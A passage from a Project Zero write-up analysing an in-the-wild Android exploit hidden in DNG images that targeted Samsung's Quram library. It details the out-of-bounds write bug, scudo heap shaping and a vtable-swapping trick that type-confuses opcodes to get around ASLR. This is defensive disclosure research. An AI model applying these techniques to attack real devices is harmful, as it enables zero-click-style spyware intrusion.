---
source: p0
source_url: https://projectzero.google/2025/12/android-itw-dng.html
title: "A look at an Android ITW DNG exploit - Project Zero"
description: "IntroductionBetween July 2024 and February 2025, 6 suspicious image files were uploaded to VirusT..."
---

## Introduction

Between July 2024 and February 2025, 6 suspicious image files were uploaded to VirusTotal. Thanks to a lead from Meta, these samples came to the attention of Google Threat Intelligence Group.

Investigation of these images showed that these images were DNG files targeting the Quram library, an image parsing library specific to Samsung devices.

On November 7, 2025 Unit 42 released a [blogpost](https://unit42.paloaltonetworks.com/landfall-is-new-commercial-grade-android-spyware/) describing how these exploits were used and the spyware they dropped. In this blogpost, we would like to focus on the technical details about how the exploits worked. The exploited Samsung vulnerability was fixed in April 2025.

There has been excellent prior work describing image-based exploits targeting iOS, such as [Project Zero’s writeup on FORCEDENTRY](https://projectzero.google/2021/12/a-deep-dive-into-nso-zero-click.html). Similar in-the-wild “one-shot” image-based exploits targeting Android have received less public documentation, but we would definitely not argue it is because of their lack of existence. Therefore we believe it is an interesting case study to publicly document the technical details of such an exploit on Android.

## Attack vector

The VirusTotal submission filenames of several of these exploits indicated that these images were received over WhatsApp:

```
IMG-20240723-WA0000.jpg
IMG-20240723-WA0001.jpg
IMG-20250120-WA0005.jpg
WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg
```

The first filenames listed follow the naming scheme of WhatsApp on Android. The last filename is how WhatsApp Web names image downloads.

The first two images were received on the same day, based on the filename, potentially by the same target. Later analysis showed that the first image targets the jemalloc allocator, while the second one targets the scudo allocator, used on more recent Android versions. This blogpost will detail the scudo version of the exploit as this allocator is more hardened and relevant for recent devices. The concepts and techniques used in the jemalloc version are similar.

The final payload (as we’ll see later) indicates that the exploit expects to run within the `com.samsung.ipservice` process. How are WhatsApp and `com.samsung.ipservice` related and what is this process?

The `com.samsung.ipservice` process is a Samsung-specific system service responsible for providing “intelligent” or AI-powered features to other Samsung applications. It will periodically scan and parse images and videos in Android’s [`MediaStore`](https://developer.android.com/reference/android/provider/MediaStore).

When WhatsApp receives and downloads an image, it will insert it in the `MediaStore`. This means that downloaded WhatsApp images (and videos) can hit image parsing attack surface within the `com.samsung.ipservice` application.

However, WhatsApp does not intend to automatically download images from untrusted contacts. (WhatsApp on Android’s logic is a bit more nuanced though. More details can be found in Brendon Tiszka’s [report](http://project-zero.issues.chromium.org/issues/442425914) of a different issue). This means that without additional bypasses and assuming the image is sent by an untrusted contact, a target would have to click the image to trigger the download and have it added to the MediaStore. This would mean this is in fact a “1-click” exploit. We don’t have any knowledge or evidence of the attacker using such a bypass though.

## A curious image

Before we delve into the exploit, let’s gather an understanding of what type of file we are looking at.

```

$ file "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg"
WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg: TIFF image data, little-endian, direntries=24, width=1, height=1, bps=8, compression=none, PhotometricInterpretation=BlackIsZero, description={"shape": [1, 1, 1]}, manufacturer=Canon, model=Canon EOS 350D DIGITAL, orientation=upper-left
$ exiftool "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg"
...
File Type                       : DNG
File Type Extension             : dng
MIME Type                       : image/x-adobe-dng
...
Image Width                     : 16
Image Height                    : 16
Bits Per Sample                 : 8
Compression                     : Uncompressed
Photometric Interpretation      : Color Filter Array
Image Description               : {"shape": [16, 16]}
Samples Per Pixel               : 1
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Tile Width                      : 16
Tile Length                     : 16
Tile Offsets                    : 6596538
Tile Byte Counts                : 256
CFA Repeat Pattern Dim          : 2 2
CFA Pattern 2                   : 0 1 1 2
CFA Plane Color                 : Red,Green,Blue
CFA Layout                      : Rectangular
Active Area                     : 0 0 10 10
Opcode List 1                   : [opcode 23], [opcode 23], [opcode 23], [opcode 23], ...
Opcode List 2                   : [opcode 23], [opcode 23], [opcode 23], [opcode 23], [opcode 23], ...
Opcode List 3                   : TrimBounds, DeltaPerColumn, DeltaPerColumn, DeltaPerColumn, ...
Subfile Type                    : Full-resolution image
Strip Offsets                   : 6596794
Strip Byte Counts               : 1
...
```

(We truncated the “Opcode List” lines, since they contained thousands of opcodes in the actual `exiftool` output.)

Although the image was saved with a `jpeg` extension, this image is in fact a Digital Negative (DNG) image. According to [Wikipedia](https://en.wikipedia.org/wiki/Digital_Negative):

_Digital Negative (DNG) is an open source, lossless, well defined camera RAW data container with the goal to replace a range of proprietary, closed source raw image containers. It has been developed by Adobe._

_…_

_DNG is based on the TIFF/EP standard format, and mandates significant use of metadata. The specification of the file format is open and not subject to any intellectual property restrictions or patents._

The image width and height look suspiciously small. And what are these opcode lists?

## Some DNG format basics

The DNG format specification can be found on [Adobe’s website](https://helpx.adobe.com/camera-raw/digital-negative.html).

DNG files use SubIFD trees, as described in the TIFF-EP specification, in order to contain multiple versions of the same image, such as a preview and a main image. This DNG file has 3 SubIFDs:

- Type “Preview Image” with width 1 and length 1
- Type “Main Image” with width 16 and length 16
- Type “Main Image” with width 1 and length 1

As we mentioned already briefly, the sizes of these images are obviously very suspicious, as well as the fact that there are 2 “Main Image” types. We have not figured out what the purpose of the second main image is (if any).

DNG images can contain 3 “opcode lists”. As it will turn out, these “opcodes” will be very important in the context of this exploit. Their goal is to offload some processing steps from the camera to the DNG reader. Their intended use case is for example to perform lens corrections. The reason there are 3 opcode lists is because they are intended to be applied at different moments during the DNG decoding:

1. The raw image bytes are read from the DNG file, a.k.a. the “stage 1” image
   - Opcode list 1 specifies the list of opcodes that should be applied to the stage 1 image
2. The DNG decoder maps the raw image bytes to linear reference values, which results in a “stage 2” image.
   - Opcode list 2 specifies the list of opcodes that should be applied to the stage 2 image
3. The DNG decoder performs [demosaicing](https://en.wikipedia.org/wiki/Demosaicing) of the linear reference values, which results in a “stage 3” image.

   - Opcode list 3 specifies the list of opcodes that should be applied to the stage 3 image.

Every opcode has an opcode ID and varying number and type of parameters. The [latest specification](https://helpx.adobe.com/camera-raw/digital-negative.html) (1.7.1.0 from September 2023), contains 14 distinct opcodes, with opcode IDs going from 1 to 14. Below is an example of opcode description found in the specification:

|     |
| --- |
| ![](<Base64-Image-Removed>) |

For this exploit, only 3 opcodes will be of interest:

- `TrimBounds` (opcode ID 6): This opcode trims the image to a specified rectangle.
- `MapTable` (opcode ID 7): This opcode maps a specified area and plane range of an image through a 16-bit lookup table.
- `DeltaPerColumn` (opcode ID 11): This opcode applies a per-column delta (constant offset) to a specified area and plane range of an image.

`DeltaPerColumn` and `MapTable` perform transformations on areas (defined by a top, left, bottom and right parameter) and plane ranges (defined by a first plane and number of planes parameter).

Looking at the opcode lists in the `exiftool` output above, we already notice some suspicious things:

- They use opcodes with opcode ID 23 (which `exiftool` can not map to an opcode name).
- Typical benign DNG images will contain only a handful of opcodes, while for this image we have thousands of opcodes in the opcode lists.

## Quram

As we mentioned before, the targeted process based on the payload is the Samsung firmware specific `com.samsung.ipservice`. The next question then becomes what code in this application performs the DNG decoding.

Looking at a decompiled `com.samsung.ipservice` APK (which on our test phone was located at `/system/priv-app/IPService/IPService.apk`), we can see that when the application parses a file with an extension of “jpg”, “jpeg”, “JPG” or “JPEG”, it will call into the Java method `com.quramsoft.images.QrBitmapFactory.decodeFile` (bundled in the same APK).

```
public class com.quramsoft.images.QrBitmapFactory {

   public static Bitmap decodeFile(String str, Options options) {
        Bitmap decodeFile = QuramBitmapFactory.decodeFile(str, options); // [1]; calls into Java_com_quramsoft_images_QuramBitmapFactory_nativeDecodeFile2
                                                                         // Fails
        if ((options.inJustDecodeBounds && (options.outWidth > 0 || options.outHeight > 0)) || decodeFile != null) {
            return decodeFile;
        }
        try {
            Bitmap decodeFile2 = QuramDngBitmap.decodeFile(str, options); // [2]; calls into Java_com_quramsoft_images_QuramDngBitmap_DecodeDNGImageBufferJNI
            if (options.outWidth <= 0) {
                if (options.outHeight <= 0) {
                    return decodeFile2;
                }
            }
            options.outMimeType = "image/dng";
            return decodeFile2;
        } catch (IOException e2) {
            e2.printStackTrace();
            return null;
        }
    }
```

The “Quram library” is a set of proprietary, closed-source software libraries used by Samsung on its Android devices. Its primary function is to process, parse, and decode various image formats. The library is not developed by Samsung itself. It is created by a third-party software vendor named Quramsoft. Mateusz Jurczyk already [wrote](https://projectzero.google/2020/07/mms-exploit-part-1-introduction-to-qmage.html) about this library in 2020.

The `QrBitmapFactory.decodeFile` method will first try to decode the image using `QuramBitmapFactory.decodeFile` (see \[1\]), which calls the exported `Java_com_quramsoft_images_QuramBitmapFactory_nativeDecodeFile2` function of the native library `libimagecodec.quram.so`. This function handles formats such as PNG, JPEG and GIF, but not DNG. This native library is not part of the `IPService` APK but rather located at `/system/lib64/libimagecodec.quram.so`.

When `QuramBitmapFactory.decodeFile` fails, `QrBitmapFactory.decodeFile` calls `QuramDngBitmap.decodeFile` as a fallback (see \[2\]), which then calls `Java_com_quramsoft_images_QuramDngBitmap_DecodeDNGImageBufferJNI`. This function will perform the complete DNG decoding and it is within this code path the vulnerability is triggered and the exploit fully executes.

The call sequence is summarized below:

```
com.quramsoft.images.QrBitmapFactory.decodeFile (com.samsung.ipservice.apk)
|_ com.quramsoft.images.QuramBitmapFactory.decodeFile (com.samsung.ipservice.apk)
|  |_  Java_com_quramsoft_images_QuramBitmapFactory_nativeDecodeFile2 (/system/lib64/libimagecodec.quram.so) // Fails
|
|_ com.quramsoft.images.QuramDngBitmap.decodeFile (com.samsung.ipservice.apk)
   |_ Java_com_quramsoft_images_QuramDngBitmap_DecodeDNGImageBufferJNI (/system/lib64/libimagecodec.quram.so) // Triggers bug
```

## Analysis setup

A few tools came in handy when analysing this exploit, which we’ll describe next.

First of all, on the static analysis side, we need an overview of the different opcodes that are called with their parameters. `exiftool` only gives us a list of the (translated) opcode IDs. To inspect every opcode with its parameters, we can use the [`dng_validate` tool](https://cs.android.com/android/platform/superproject/main/+/main:external/dng_sdk/Android.bp;l=206;drc=73bff36f7afeb6a349a44c83d7b13bf4faee4158) provided by Adobe’s DNG SDK with the `-v` flag. It will parse the opcode lists and we can post-process its textual output to make sense of the thousands of opcodes. Here is a snippet of what the output looks like, showing us the different parameters of a few `TrimBounds` and `DeltaPerColumn` opcodes.

```
...
Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1

Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1

Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1

Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1

Parsing OpcodeList3: 5347 opcodes

Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
Bounds: t=0, l=0, b=1, r=1

Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=0, b=1, r=1, p=5125:5123, rp=1, cp=1
Count: 1
    Delta [0] = 26214.000000

Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=0, b=1, r=1, p=5127:5125, rp=1, cp=1
Count: 1
    Delta [0] = 26214.000000

Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=0, b=1, r=1, p=5157:5155, rp=1, cp=1
Count: 1
    Delta [0] = 26214.000000
...
```

On the dynamic analysis side, debugging `com.samsung.ipservice` would be very annoying, since it only runs periodically (although there are tricks to force start it). For easier debugging, we reused [@flankerhqd’s fuzzing harness](https://github.com/flankerhqd/vendor-android-cves/blob/master/dng-fuzzing/dngdriver.c) (in part based on [Project Zero’s SkCodecFuzzer](https://github.com/googleprojectzero/SkCodecFuzzer)), which loads a DNG file provided as a filename into a buffer and passes it to `libimagecodec.quram.so`’s `QrDecodeDNGPreview`. We compile it as a standalone binary and can run it under a debugger.

It is noteworthy that `QrDecodeDNGPreview` (used in our harness) is not the export called by `com.samsung.ipservice` (which ends up calling `QuramDngDecoder::decode`). However, if there is no preview image available with one of the JPEG compression types, `QrDecodeDNGPreview` will call `QuramDngDecoder::decodePreview`, which will also perform a full DNG decoding and successfully triggers the vulnerability and exploit.

Our test phone was a Samsung Galaxy S21 5G (SM-G991B) running firmware version G991BXXSAFXCL, which has a security patch level of 2024-04-01.

## The bug

Using the `dng_validate` tool we can make a listing of the sequence of opcodes called and their number of repetitions:

```
$ grep Opcode dng_validate.out  | uniq -c
      1 OpcodeList1: count = 320004, offset = 814
      1 OpcodeList2: count = 3844, offset = 320818
      1 OpcodeList3: count = 6271556, offset = 324662
      1 Parsing OpcodeList1: 20000 opcodes
  20000 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
      1 Parsing OpcodeList2: 240 opcodes
    240 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
      1 Parsing OpcodeList3: 5347 opcodes
      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
    480 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      1 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      2 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      1 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
    400 Opcode: TrimBounds, minVersion = 1.4.0.1, flags = 1
      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     48 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
    216 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     24 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
     15 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      1 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     34 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
    240 Opcode: TrimBounds, minVersion = 1.4.0.1, flags = 1
      2 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     48 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      2 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
    216 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      4 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
     12 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
      6 Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
   2438 Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
   1040 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
      1 Opcode: ScalePerColumn, minVersion = 1.4.0.0, flags = 1
```

The specification mentions that if the flag bit is set (which it is), opcodes with unknown opcode IDs should be skipped. So let’s for the moment ignore the “Unknown” opcodes with ID 23 (more on them later).

Let’s look at the first 2 known opcodes, which occur in opcode list 3:

```
$ grep -A8 TrimBounds dng_validate.out  | head -n 8
Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
Bounds: t=0, l=0, b=1, r=1

Opcode: DeltaPerColumn, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=0, b=1, r=1, p=5125:5123, rp=1, cp=1
Count: 1
    Delta [0] = 26214.000000
```

The DNG opcode parameters are embedded directly in the file. DeltaPerColumn takes a list of deltas to be applied to each pixel and the “Area Spec” to work over: top, left, right, bottom coordinates, the plane and total number of planes being targeted, and the length of each row and column (rowPitch and colPitch). These values are controllable by the attacker.

The “first plane” (5125) and “number of planes” (5123) parameters of the `DeltaPerColumn` opcode are very suspicious. At stage 3 in the DNG decoding, the number of planes will be 3 (R, G and B), as can be seen in the [CFA](https://en.wikipedia.org/wiki/Color_filter_array) related data of the `exiftool` output. The first value (5125) is the first plane to apply the DeltaPerColumn to, while the second value (5123) is the number of planes. Since the planes are numbered 0 to 2, these values are clearly out of bounds.

Let’s have a look at `QuramDngOpcodeDeltaPerColumn::processArea`, which is the handler for the `DeltaPerColumn` opcode. Below are the relevant lines of that function for the vulnerability. (Variable names are chosen by us since this is a closed source library)

```
__int64 __fastcall QuramDngOpcodeDeltaPerColumn::processArea(
        QuramDngOpcode *opcode,
        QuramDngDecoder *decoder,
        QuramDngImage *image,
        QuramDngRect *rect)
{
...
    image_buffer = image->buffer;
...
                image_number_of_planes = image_buffer->planes;  // 3
                opcode_first_plane = opcode->plane;  // 5125
....
                opcode_number_of_planes = opcode->planes;  // 5123
                opcode_last_plane = image_number_of_planes + opcode_number_of_planes;  // 3 + 5123 = 5126
...
                    if (opcode_first_plane < opcode_last_plane )  // 5125 < 5126
                    {
...
                            current_plane = opcode_first_plane;  // 5125
...
                                do
                                {
...                                 // Add delta to the value in the raw pixel buffer at offset corresponding to plane `current_plane`, i.e. 5125!
                                    current_plane++;
                                }
                                while ( current_plane != opcode_last_plane );  // 5125 != 5126
...
}
```

The function takes a few objects with Quram specific structure as arguments. The `QuramDngImage` describes the image on which the opcode is to be applied (which is the stage 3 image at this point). The `QuramDngOpcode` contains the `DeltaPerColumn` parameters. The function has a triple nested loop to iterate over the width, length and planes of the area. For every such triplet (width,length,plane) it calculates the offset in the raw pixel buffer and adds a delta to it. Only the plane loop is relevant for the bug and displayed in the code above.

Below is an example of a 6x6 image with its different color planes and to what offsets the pixel values map in the raw pixel buffer. During stage 2 and stage 3 image processing, each pixel value in each color plane takes 16 bits.

![](<Base64-Image-Removed>)

There are two issues in that handler function:

- `opcode_last_plane` is calculated incorrectly. It should be `opcode_first_plane + opcode_number_of_planes` (as will be the case in the patched version). This by itself is a correctness issue (and a pretty basic one that would be expected to surface by normal usage or testing of the library).
- The plane used in the offset calculation is bounded by `opcode_last_plane`, but at no point is it checked that `opcode_last_plane` is within the number of planes that the image contains.

The actual values from the exploit are annotated as comments in the code snippet. With these values, the plane loop will be executed exactly once. The width and length loop will also be executed only once, since `t=0, l=0, b=1, r=1`. This means exactly one write will happen. Since the stage 3 image in the exploit has a width 1 and length 1, the write will happen at offset 5125 x 2 = 10250 from the raw pixel buffer.

Not only the offset of the write is controlled, the value to be added to the current value in the raw pixel buffer is also fully controlled, since it is an opcode parameter. In this case it is 26214.0 (or 0x6666). This vulnerability gives thus a very strong primitive from the start: the attacker can add chosen values at chosen offsets with respect to the raw pixel buffer.

Now why do we need that TrimBounds opcode before triggering the bug? That will become clear when we discuss the heap shaping strategy.

## Exploit flow

### Heap shaping strategy

Since the buffers containing the pixel values are dynamically allocated on the heap, it is important to understand what heap allocations the Quram library makes and how these allocations behave to understand the heap layout at the time of the vulnerability triggering.

As we mentioned earlier, exploits exist for Android versions using both jemalloc and scudo allocator. We will analyse the exploit targeting the scudo allocator, since this is the common allocator on modern Android versions. The same techniques were used in a different way in the jemalloc exploit.

#### Scudo

We will not give a detailed overview of Android’s scudo allocator, which is being used here for the allocations, since [excellent documentation by Synacktiv](https://www.synacktiv.com/en/publications/behind-the-shield-unmasking-scudos-defenses) already exists, to which we refer. We will only mention the elements that are important for this exploit.

Scudo allocates objects in different heap regions depending on the allocation size. For two objects of different types to land near each other, they need to belong to the same size class. The size required from the allocator’s point of view for a “block” is composed of:

- A header of 0x10 bytes
- The chunk with the user requested size. A pointer to the chunk is returned to the caller.

New allocations are retrieved via “transfer batches”. The number of allocations in a transfer batch depends on the size class. For the size we will be interested in (chunks of 0x30 bytes, i.e. blocks of 0x40 bytes), there are 52 allocations in a transfer batch. The allocations within a transfer batch are returned in a randomized order, however subsequent transfer batches are just laid out linearly in memory. A consequence of this is that given enough allocations between two allocations of the same size, an attacker can be confident that the last allocation falls after the first allocation.

Lastly, scudo supports a quarantine mechanism that prevents freed allocations to be returned immediately on a next allocation request. However on Android this quarantine mechanism is disabled. The consequence is that a freed object will be directly reallocated on the next allocation request of the same size.

#### Quram’s heap allocations

With a basic understanding of scudo’s allocation behaviour, let’s look at the specific heap allocations Quram makes when decoding a DNG file.

First, when Quram parses the opcode lists in the DNG file, it will allocate one `QuramDngOpcode` object per opcode. These objects contain the parameters of the opcode, as well as a vtable pointer to the handlers for that opcode. The size of such an object depends thus on the number and type of parameters and hence on the type of opcode. The size of the different opcodes can be looked up in `QuramDngDecoder::makeDngOpcode`. For the exploit at hand, only the following opcode sizes are relevant:

- `DeltaPerColumn` (opcode ID 11): 0x50 bytes
- `MapTable` (opcode ID 7): 0x50 bytes
- `TrimBounds` (opcode ID 6): 0x30 bytes
- `Unknown` (starting at opcode ID 14, such as opcode ID 23 in the exploit): 0x30 bytes

This means `TrimBounds` and `Unknown` opcodes will land in the same heap region, distinct from the heap region containing the `DeltaPerColumn` and `MapTable` opcodes.

Next, for every stage image, Quram will allocate three heap buffers:

- A `QuramDngImage` of fixed size 0x30, which describes the image
- A buffer for the pixel values of variable size (depending on width, height and number of planes)
- A `QuramDngPixelBuffer` of fixed size 0x40, which describes the contents of the buffer

These different objects and their relationship are illustrated below:

![](<Base64-Image-Removed>)

There are two “pixel buffers” at play here, which can be a bit confusing: the `QuramDngPixelBuffer` object and the raw buffer with pixel values. In what comes, when we talk about “raw pixel buffer”, we refer to the latter.

`QuramDngImage` and `QuramDngPixelBuffer` will land in different heap regions since they belong to different scudo allocation class sizes. The raw pixel buffer may end up in the same heap region as a `QuramDngImage` depending on its size. Its size is calculated by `ComputeBufferSize`. For the dimensions of the stage 3 image of the exploit (width 1 by length 1 with 3 color planes) it will calculate a size of 0x30 bytes (even though 6 bytes would suffice). For the stage 1 and stage 2 images, the sizes are different and will be allocated in a different heap region.

To conclude, both the `TrimBounds` opcodes, the `Unknown` opcodes, the `QuramDngImage` objects as well as potentially the raw pixel buffer will end up in the same heap region.

#### Final heap layout

We can now study the sequence of events during DNG decoding to understand the heap layout at the time of the vulnerability trigger:

- `QuramDngDecoder::getRegionStage1Image` will allocate a “stage 1” QuramDngImage (size 0x30)
- `QuramDngDecoder::readStage1Image` parses the 3 opcode lists and allocates a QuramDngOpcode structure per opcode. As we saw, only `TrimBounds` and `Unknown` opcodes will land in the same heap region of 0x30 bytes chunks, which is of interest to us. Other opcodes are allocated in different heap regions.

```
$ grep -E 'OpcodeList|TrimBounds|Unknown' dng_validate.out  | uniq -c
      1 OpcodeList1: count = 320004, offset = 814
      1 OpcodeList2: count = 3844, offset = 320818
      1 OpcodeList3: count = 6271556, offset = 324662
      1 Parsing OpcodeList1: 20000 opcodes
  20000 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
      1 Parsing OpcodeList2: 240 opcodes
    240 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
      1 Parsing OpcodeList3: 5347 opcodes
      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
    640 Opcode: TrimBounds, minVersion = 1.4.0.1, flags = 1
   1040 Opcode: Unknown (23), minVersion = 1.4.0.0, flags = 1
      1 Opcode: TrimBounds, minVersion = 1.4.0.0, flags = 1
```

- `QuramDngDecoder::buildStage2Image` will apply opcode list 1. When it is done, the 20000 unknown opcodes it contains are freed.
- `QuramDngDecoder::doBuildStage2` will allocate a `QuramDngImage` “stage 2” (size 0x30) and convert stage 1 to stage 2. This stage 2 image will take the spot of the last opcode of opcode list 1 that was freed.
- `QuramDngDecoder::buildStage2Image` can now free the “stage 1” `QuramDngImage`. It will then process the opcode list 2, and free the 240 “unknown” opcodes.
- `QuramDngDecoder::doInterpolateStage3` will allocate both a new “stage 3” `QuramDngImage` (size 0x30) and subsequently a raw pixel buffer of size 0x30. These will take the spots of the last 2 opcodes freed from opcode list 2 in the previous step.
- `QuramDngDecoder::buildStage3Image` can now free the “stage 2” `QuramDngImage`.
- Opcode list 3 gets processed now. In the first `TrimBounds` opcode, `QuramDngOpcodeTrimBounds::doApply` will allocate a new raw pixel buffer of size 0x30 (although the replaced raw pixel buffer has the exact same size). This allocation will take the spot of the freed stage 2 image.

  - Note that the 640 other `TrimBounds` opcodes have a “minVersion” of 1.4.0.1. This is a trick that will make `QuramDngOpcode::aboutToApply` bail out early and not have the `TrimBounds` actually executed. The goal of spraying these 640 `TrimBounds` opcodes will become clear later.

The eventual heap layout for chunks of size 0x30 is illustrated below. The annotated offsets will be important later on.

![](<Base64-Image-Removed>)

Note that because of scudo’s randomization strategy, the allocations of different opcode lists will actually overlap slightly (on the order of 52 allocations), but given enough allocations this effect can be neglected.

Because the allocations have chunk sizes of 0x30 bytes, they take up 0x40 bytes on the heap. Different chunks in this heap region are thus spaced by multiples of 0x40 bytes, which will help us in quickly inferring what parts of an object are being corrupted. The illustration also depicts the sizes the allocations occupy in total, which will be important for understanding the subsequent exploitation flow.

As we’ll see, the exploit will write out of bounds from the raw pixel buffer of stage 3 into the QuramDngImage of stage 3. This explains why the attackers first used a TrimBounds opcode before triggering the bug: it assures that the raw pixel buffer will end up _before_ the `QuramDngImage`. Without it, there would be a one out of two chance that the raw pixel buffer takes a spot _after_ the QuramDngImage.

### The initial corruption

After achieving the right heap layout using the `TrimBounds`, 480 `DeltaPerColumn` opcodes follow. As a reminder, these are allocated in a different heap region because of a different allocation size. As discussed, `DeltaPerColumn` opcodes are able to add arbitrary values to arbitrary offsets out of bounds. The attackers add 0x6666 to offsets 10 and 12 within 240 heap objects, starting at offset 0x2800 from the raw pixel buffer and ending at offset 0x6400.

Looking at our heap layout, we will corrupt three types of objects at these offsets:

- `Unknown` and `TrimBounds` opcodes: opcode structures contain the opcode ID at offset 8 and the specification version at offset 12. Since the opcode IDs will be corrupted, these `TrimBounds` and `Unknown` opcodes will simply be skipped later on (which was already the case for the `Unknown` opcodes).

```
Before:
0xb400007e3e3fa050:     0x0000007fee5a3fb0      0x0104000000000017
0xb400007e3e3fa060:     0x0000000100000001      0x0000000000000002
0xb400007e3e3fa070:     0x0000000000000000      0x0000000000000000
After:
0xb400007e3e3fa050:     0x0000007fee5a3fb0      0x676a000066660017
0xb400007e3e3fa060:     0x0000000100000001      0x0000000000000002
0xb400007e3e3fa070:     0x0000000000000000      0x0000000000000000
```

- Most importantly, it will encounter the `QuramDngImage` object. The two corrupted fields of this object are the “bottom” and “right” fields of the image, which are used in other opcode handlers for verifying if operations are within bounds. This means that we can now use other opcodes, such as MapTable, to perform actions out of bounds.

```
Before:
0xb400007e3e3fb810:     0x0000000000000000      0x0000000100000001
0xb400007e3e3fb820:     0x0000000300000003      0xb400007f1e2d7ad0
0xb400007e3e3fb830:     0xb400007e3e3f7850      0x0000000000000030
After:
0xb400007e3e3fb810:     0x0000000000000000      0x6666000166660001
0xb400007e3e3fb820:     0x0000000300000003      0xb400007f1e2d7ad0
0xb400007e3e3fb830:     0xb400007e3e3f7850      0x0000000000000030
```

If we look for example at the first MapTable that follows, it looks like:

```
Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=5120, b=1, r=5121, p=0:1, rp=1, cp=1
Count: 65536
```

Under regular circumstances, the “left” and “right” value would be out of bounds and this opcode would not perform any operation. Because we corrupted the dimensions of the QuramDngImage though, this opcode will operate out of bounds.

### Extending the primitives

Incrementing arbitrary out of bound values with chosen values is a powerful primitive, but the exploit will also want to write absolute arbitrary values out of bounds. The former can be converted pretty easily into the latter though.

If we have a primitive to write zeros out of bounds, we can combine that with the increment primitive to write arbitrary values in two steps: zero the memory and then increment it with the value we want to write.

Zeroing memory can be done in two ways, and both are used in the exploit:

- Using the `MapTable` opcode with a substitution table of all zeros
- Using the `DeltaPerColumn` opcode. The “Delta” parameter is a float, and -Infinity is supported, which sets the resulting value to 0.

In the exploit, `MapTable` is only used to zero large regions, likely because of the large space overhead of the `MapTable` opcode (as it requires a substitution table of 65536 values to be included).

### Crafting a bogus MapTable opcode

With linear out-of-bounds write primitive in place, the exploit could now:

- Write a shell command somewhere out of bounds
- Write a JOP gadget chain somewhere out of bounds which ends up calling `system()`
- Overwrite the vtable pointer of one of the opcode objects to be executed to kick off the JOP chain, resulting in a `system(<shell command>)` execution

There is one important issue though: we don’t know any of the required addresses, since both the heap and the libraries are subject to ASLR. To leak the addresses of the JOP gadgets, the exploit has to do a bit more work.

Let’s show the first `MapTable` opcode again:

```
Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=5120, b=1, r=5121, p=0:1, rp=1, cp=1
Count: 65536
```

This opcode will act on offset `5120 x 2 bytes/pixel x 3 colors/pixel = 0x7800` from the raw pixel buffer, which is in the region of those 641 TrimBounds opcodes.

![](<Base64-Image-Removed>)

It is corrupting the lower 2 bytes of the vtable pointer of a `TrimBounds` opcode object. Looking at the substitution table, most values are mapped to itself, however a few are not. (We had to write an additional script to parse this out, since `dng_validate`’s output of these long substitution tables is truncated).
For example, the value 0xecf0 is mapped to 0xed30. Looking at the `libimagecodec.quram.so` binary, the new address points to the `MapTable` vtable. This trick allows the attackers to “type confuse” a `TrimBounds` opcode to a `MapTable` opcode, by moving the vtable pointer to a different one, without having to leak any ASLR first.

Their substitution table supports different versions of the library, which works because there are not that many versions of the library (the exploit supports 7 versions) and the lower bytes of the vtable do not collide. Moreover, since ASLR is applied at page level granularity, they need to account for every page multiple the vtable can be mapped at. Say we have the following vtable offsets:

|  | `libimagecodec.quram.so` version x | `libimagecodec.quram.so` version y |
| --- | --- | --- |
| `QuramDngOpcodeTrimBounds` vtable offset | `0x2dccf0` | `0x2dce10` |
| `QuramDngOpcodeMapTable` vtable offset | `0x2dcd30` | `0x2dce50` |

Then the following `MapTable` substitution table would be constructed (omitting values that don’t matter and can map to whatever):

```
index  : value
0x0cf0 : 0x0d30
0x0e10 : 0x0e50
0x1cf0 : 0x1d30
0x1e10 : 0x1e50
0x2cf0 : 0x2d30
0x2e10 : 0x2e50
0x3cf0 : 0x3d30
0x3e10 : 0x3e50
